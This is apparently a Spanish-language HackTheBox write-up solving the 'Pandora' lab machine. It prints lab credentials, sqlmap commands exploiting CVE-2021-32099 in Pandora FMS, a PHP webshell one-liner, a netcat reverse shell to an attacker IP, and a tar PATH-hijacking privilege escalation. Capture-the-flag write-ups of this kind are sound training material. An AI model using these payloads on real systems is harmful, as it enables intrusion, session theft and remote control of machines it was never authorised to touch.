Pandora HackTheBox

By T3sla
Posted 2022-05-18 6 min read

Bienvenidos/a

Este artículo tratará la resolución de la máquina Pandora de la plataforma de Ciberseguridad HackTheBox.

Información sobre la máquina


Bueno, esta máquina tiene una dificultad fácil, pero digo desde ya que no es una máquina fácil, ja, ja. Muy divertida y aprendí bastantes cosas en su momento. Sin duda mi máquina favorita <3.

Matrix

  • SQLI (Sql Injection)
  • SNMP (Protocolo simple de administración de red)
  • UDP
  • Path Hijacking
  • CVE-2021-32099
  • Local Port Forwarding

Reconocimiento

Nmap (TCP-UDP)

1
2
3

nmap -sSU --min-rate 12000 -Pn -n -p- --open -v 10.10.11.136
nmap -sS -sCV -n -p 22,80 -T5 -Pn -n -v 10.10.11.136
nmap -sU -sCV -n -p 161 -T5 -Pn -v 10.10.11.136

Procedemos a buscar exploits públicos que afecten a las versiones de estos servicios, pero no encontramos nada interesante.

Servidor Web

Demos un vistazo a lo que almacena el servidor web. Pues al parecer el servidor web almacena un sitio web estático y poco podríamos hacer, pero conseguimos un dominio. Procedemos a agregar el dominio.

1

vim /etc/hosts


Ya estaría haciendo la resolución DNS, podríamos buscar subdominios, pero los tiros no van por ahí.

SNMP

Ahora nos queda el SNMP. Buscando un poco encontramos bastante información (dejaré los recursos al final) vamos a emplear la herramienta snmpwalk. Al ejecutar la herramienta nos da información bastante útil como la versión del Kernel Linux y un posible usuario (Daniel). Incluso podemos ver procesos que se están ejecutando. Luego de esperar un poco encontramos unas credenciales (yo envíe la salida del comando a un fichero para luego filtrar).

1

snmpwalk -v 2c -c public 10.10.11.136 > snmp

Intrusión

SSH

Vamos a verificar que las credenciales obtenidas anteriormente sean válidas.

1

ssh daniel@panda.htb /* HotelBabylon23 */

Estamos dentro ;).
Ahora a enumerar un poco el sistema. Vemos que hay otro usuario llamado Matt. Al ingresar al directorio del usuario Matt vemos que está el flag, pero lamentablemente no tenemos permisos de lectura ni escritura. Al listar el directorio /var/www/ vemos que está el sitio web estático y hay una aplicación web que no tenemos acceso. También está corriendo el servicio MySQL. Podemos saber esto de dos formas viendo que servicios están en escucha y ver si el demonio de MySQL está corriendo.

1
2

netstat -lt /* -l:escuha y -t:TCP */
systemctl status mysql

Entonces con esta información recopilada estamos seguro de que los tiros van con la aplicación web.

Local Port Forwarding

Para poder acceder a la aplicación web vamos a emplear una técnica de pivoting que se conoce como Local port forwarding.

No es más que traer los servicios que corren en los diferentes puertos de la máquina objetiva a nuestra máquina y así poder acceder a ellos, ya que esos servicios son internos y no están expuestos.

1

ssh -L 1313:localhost:80 daniel@panda.htb /* :tu_puerto:localhost:puerto-de-la-máquina host-remoto */

Explotación

Bueno, ya tendríamos acceso a la aplicación web, toca buscar algún CVE que afecte a la versión de Pandora FMS. Luego de buscar hay varios CVEs que afectan, pero ninguno funcional, ya que la versión está con parches.

Busquemos “pandora v7 742 CVE”. Nos encontramos un blog bastante suculento que explica a detalle las diferentes vulnerabilidades que afectan a esa versión de Pandora FMS. Lo que más llama la atención es la SQLI a buscar por el CVE si hay algún tipo de exploit, pero ya con leer un poco el blog (o buscar información en otra parte acerca de la vulnerabilidad) ya podríamos explotar nosotros la vulnerabilidad. El fichero chart_generator.php contiene el parámetro vulnerable session_id.

SQLI

Para explotar la vulnerabilidad de inyección SQL usaré la herramienta sqlmap, ya que todavía no sé explotar una SQLI manual de manera correcta.

1

sqlmap --url "http://localhost:1313/pandora_console/include/chart_generator.php?session_id=" --random-agent -o --level=5 --risk=3 --method="GET" --cookie="jm3i5g44ifdfl3417p9gnh9nur" --dbms=mysql --tamper=space2comment --dbs

Ahora nos queda encontrar la tabla que almacena el valor de la cookie con el usuario admin y así poder acceder a la dashboard.

1
2

sqlmap --url "http://localhost:1313/pandora_console/include/chart_generator.php?session_id=" --random-agent -o --level=5 --risk=3 --method="GET" --cookie="jm3i5g44ifdfl3417p9gnh9nur" --dbms=mysql -D pandora --tables

Bastantes, tablas, ja, ja, ja. Luego de estar un buen ratito buscando la tabla correcta, la que más llama la atención es tsessions_php.

1

sqlmap --url "http://localhost:1313/pandora_console/include/chart_generator.php?session_id=" --random-agent -o --level=5 --risk=3 --method="GET" --cookie="jm3i5g44ifdfl3417p9gnh9nur" --dbms=mysql -D pandora -T tsessions_php --dump

Bueno, ahora solo hay que encontrar el valor de la cookie correcto (PHPSESSID) y así poder hacer un robo de sesión. Para cambiar el valor de la cookie hay dos formas de hacerlo con una extensión en tu navegador web o desde las mismas herramientas de desarrollador. Remplazos el valor haciendo doble clic. Y listo evadimos el login. Ahora solo necesitamos conseguir una Shell y esto lo podríamos hacer subiendo una webshell. Pero hay un problema con este usuario, no podemos hacer mucho, ya que no cuenta con los privilegios adecuados, tendremos que conseguir la sesión del admin.

También en un repo está el PoC del CVE, donde está la sentencia SQL maliciosa, ya que él lo exploto de forma manual.. Ya estamos como el usuario admin (;.

WebShell

Para subir nuestra webshell no vamos al sidebar Admin tools y luego File manager.

Yo utilizare esta webshell.

1

<?php system($_GET['cmd']); ?>

Listo, ahora nos queda ir al PATH (/pandora_console/images/backgrounds/webshell.php). Ahora que tenemos un RCE nos queda entablarnos la Reverse Shell.

1
2

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.121 1212 >/tmp/f
nc -lvnp 1212


Listo obtenemos la Shell ahora a leer el flag y luego el privesc.

Escalada de privilegios

Enumerando un poco el sistema no tenemos nada interesante en crontabs, grupos pero si en binarios SUID.
Ese binario no es nada común. 🤔 A ejecutar el binario. 🎉 Lo que más me llama la atención es tar y por deducción que trata de descomprimir el fichero comprimido. Podríamos subir pspy para visualizar procesos en tiempo real y ver si obtenemos un poco más de información.

PATH HIJACKING

Con el binario tar porque pandora_backup lo utiliza.

El PATH hijacking no es más que engañar de alguna forma el lugar de la ejecución del binario, ya que gracias a la variable de entorno $PATH ira viendo si se encuentra el binario .
Ejemplo más concreto Si yo quiero ejecutar el binario passwd ira recorriendo cada ruta de la asignacion de la variable de entorno $PATH en busca de ese binario Yo puedo engañar para que se ejecute el binario malicioso antes y no el binario legítimo.

Para simular el binario tar lo haré con el lenguaje de programación C (algo simple).
Ahora a la acción. 💣

PoC

Ja, ja, ja, un épico fail. Probaré conectándome a través de SSH al usuario Matt , ya que por alguna razón no me da la Shell como root.

1

echo "/bin/bash" > tar && chmod +x tar && ls -l tar && echo $PATH && export PATH=.:$PATH && /usr/bin/pandora_backup

¡Listo!, al final explotamos de una manera diferente como quería yo (por problemas de librerías que no tenía instalada la máquina), pero es lo mismo.
